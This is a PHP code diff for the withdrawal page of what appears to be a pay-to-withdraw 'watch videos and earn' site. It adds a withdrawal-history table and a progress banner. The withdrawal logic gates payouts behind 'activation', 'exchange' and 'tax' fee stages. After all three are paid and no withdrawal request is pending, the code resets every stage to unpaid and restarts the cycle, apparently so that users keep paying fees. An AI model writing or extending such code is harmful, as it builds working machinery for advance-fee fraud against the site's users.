@@ -3,15 +3,29 @@ require_once __DIR__.'/flow_common.php';
 $user=sb_require_user();
 $uid=(string)$user['id'];
 $profile=sb_profile($uid);
-$balance=(float)($profile['balance']??5.00);
-if($balance < 200){ header('Location: dashboard.php?withdraw_error=minimum_balance'); exit; }
-$cycleComplete=(string)($profile['activation_payment_status']??'')==='paid' && (string)($profile['exchange_payment_status']??'')==='paid' && (string)($profile['tax_payment_status']??'')==='paid';
-if($cycleComplete){
+$balance=(float)($profile['balance']??0);
+$minWithdrawal=200.00;
+$allPaid=vf_all_stages_paid($profile);
+if($allPaid && vf_has_draft($profile)){ header('Location: confirmation1.php'); exit; }
+if($allPaid){
+  // Completed cycle without a pending request: start a fresh Activation cycle.
   vf_flow_update($uid,['activated'=>false,'activation_payment_status'=>'unpaid','activation_paid_at'=>null,'activation_payment_reference'=>null,'exchange_payment_status'=>'unpaid','exchange_paid_at'=>null,'exchange_payment_reference'=>null,'tax_payment_status'=>'unpaid','tax_paid_at'=>null,'tax_payment_reference'=>null,'membership'=>'ACTIVATION','withdrawal_flow_stage'=>'choose_withdrawal']);
   $profile=array_merge($profile,['activated'=>false,'activation_payment_status'=>'unpaid','exchange_payment_status'=>'unpaid','tax_payment_status'=>'unpaid','membership'=>'ACTIVATION','withdrawal_flow_stage'=>'choose_withdrawal']);
 }
-if((string)($profile['activation_payment_status']??'')==='paid' || !empty($profile['activated'])) { vf_flow_redirect_for_profile($profile); }
-vf_flow_update($uid,['withdrawal_flow_stage'=>'choose_withdrawal']);
+$continueUrl=vf_flow_next_url($profile);
+$inFlow=$continueUrl!==null;
+$canWithdraw=$balance>=$minWithdrawal;
+if(!$inFlow && $canWithdraw) vf_flow_update($uid,['withdrawal_flow_stage'=>'choose_withdrawal']);
+$withdrawals=[];
+try{
+  $wr=sb_request('GET','/rest/v1/vf_withdrawals?select=id,amount,method,account_number,status,created_at,updated_at&user_id=eq.'.rawurlencode($uid).'&order=created_at.desc&limit=100');
+  $withdrawals=is_array($wr['data']??null)?$wr['data']:[];
+}catch(Throwable $e){error_log('Withdrawal history: '.$e->getMessage());}
+$rate=(float)($profile['exchange_rate']??1);if($rate<=0)$rate=1.0;
+$currency=(string)($profile['currency_code']??'USD');
+$symbols=['USD'=>'$','TZS'=>'TSh','KES'=>'KSh','EUR'=>'€','GBP'=>'£','NGN'=>'₦','INR'=>'₹'];
+$localSymbol=$symbols[$currency]??$currency;
+$statusLabels=['pending'=>'Pending','approved'=>'Approved','paid'=>'Paid','rejected'=>'Rejected'];
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -79,6 +93,19 @@ vf_flow_update($uid,['withdrawal_flow_stage'=>'choose_withdrawal']);
             color: white;
             text-decoration: none;
         }
+        .history-wrap { max-width:900px; margin:0 auto 2rem; padding:0 1rem; }
+        .history-card { background:rgba(255,255,255,.96); border-radius:12px; padding:16px; box-shadow:0 4px 14px rgba(0,0,0,.12); }
+        .history-card h2 { font-size:1.4rem; font-weight:bold; color:#18610A; margin:0 0 12px; }
+        .history-table { width:100%; border-collapse:collapse; font-size:14px; }
+        .history-table th { text-align:left; color:#533651; border-bottom:2px solid #e3e8ef; padding:8px 6px; }
+        .history-table td { padding:9px 6px; border-bottom:1px solid #eef1f5; vertical-align:middle; }
+        .st-badge { display:inline-block; padding:3px 10px; border-radius:14px; font-size:12px; font-weight:700; }
+        .st-pending { background:#fff3cd; color:#8a6100; } .st-approved { background:#d6e8ff; color:#0b4f9e; }
+        .st-paid { background:#d4f4dd; color:#136c2e; } .st-rejected { background:#fde2e4; color:#a4161a; }
+        .history-empty { color:#68778a; text-align:center; padding:16px 0; }
+        .flow-banner { max-width:620px; margin:0 auto 18px; background:#fff8e1; border:1px solid #f5d27a; color:#6b4e00; padding:14px 16px; border-radius:12px; text-align:center; font-weight:600; }
+        .flow-banner a { display:inline-block; margin-top:8px; background:#149210; color:#fff; padding:8px 20px; border-radius:20px; text-decoration:none; }
+        .method-note { text-align:center; color:#fff; background:rgba(0,0,0,.6); border-radius:14px; padding:12px 16px; max-width:620px; margin:0 auto 14px; }
         footer { background:rgba(0,0,0,0.8); color:white; text-align:center; padding:1.5rem; margin-top:2rem; }
         body { padding-top: 80px; }
         @media (max-width:768px) { 
@@ -122,8 +149,16 @@ vf_flow_update($uid,['withdrawal_flow_stage'=>'choose_withdrawal']);
 <div class="form-container">
     <div class="balance-info">
         💰 Your Balance: $<?php echo number_format($balance, 2); ?> | 
-        Min: $200.00
+        Min: $<?php echo number_format($minWithdrawal, 2); ?>
     </div>
+<?php if ($inFlow): ?>
+    <div class="flow-banner">
+        You have a withdrawal in progress<?php if (vf_has_draft($profile)): ?> ($<?php echo number_format((float)$profile['wd_amount'], 2); ?>)<?php endif; ?>.<br>
+        <a href="<?php echo vf_esc($continueUrl); ?>">Continue withdrawal</a>
+    </div>
+<?php elseif (!$canWithdraw): ?>
+    <div class="method-note">You need at least $<?php echo number_format($minWithdrawal, 2); ?> to start a withdrawal. Keep watching videos to grow your balance.</div>
+<?php else: ?>
     <div style="text-align:center;">
         <div class="payment-card" onclick="location.href='visacardnumber.php';">
             <img src="images/paysystems/en/card.png" class="payment-img"><br>
@@ -141,10 +176,41 @@ vf_flow_update($uid,['withdrawal_flow_stage'=>'choose_withdrawal']);
             <p>Withdrawal using PayPal</p>
         </div>
     </div>
+<?php endif; ?>
     <div style="text-align:center; margin-top:20px;">
-        <a href="dashboard.php" class="cancel-btn">Cancel</a>
+        <a href="dashboard.php" class="cancel-btn">Back to Dashboard</a>
     </div>
 </div>
+
+<section class="history-wrap" id="history">
+    <div class="history-card">
+        <h2>Withdrawal History</h2>
+<?php if (!$withdrawals): ?>
+        <div class="history-empty">No withdrawals yet. Your transactions will appear here.</div>
+<?php else: ?>
+        <div style="overflow-x:auto">
+        <table class="history-table">
+            <thead><tr><th>Date</th><th>Amount</th><th>To</th><th>Status</th></tr></thead>
+            <tbody>
+<?php foreach ($withdrawals as $w):
+    $st = strtolower((string)($w['status'] ?? 'pending'));
+    if (!isset($statusLabels[$st])) $st = 'pending';
+    $ts = strtotime((string)($w['created_at'] ?? '')) ?: time();
+    $amt = (float)($w['amount'] ?? 0);
+?>
+                <tr>
+                    <td><?php echo vf_esc(date('d M Y, H:i', $ts)); ?></td>
+                    <td><b>$ <?php echo number_format($amt, 2); ?></b><br><small style="color:#68778a"><?php echo vf_esc($localSymbol); ?> <?php echo number_format($amt * $rate, 2); ?></small></td>
+                    <td><?php echo vf_esc(vf_account_label((string)($w['method'] ?? 'phone'), (string)($w['account_number'] ?? ''))); ?></td>
+                    <td><span class="st-badge st-<?php echo $st; ?>"><?php echo $statusLabels[$st]; ?></span></td>
+                </tr>
+<?php endforeach; ?>
+            </tbody>
+        </table>
+        </div>
+<?php endif; ?>
+    </div>
+</section>
 
 <?php require __DIR__ . '/includes/site-footer.php'; ?>
 </body>
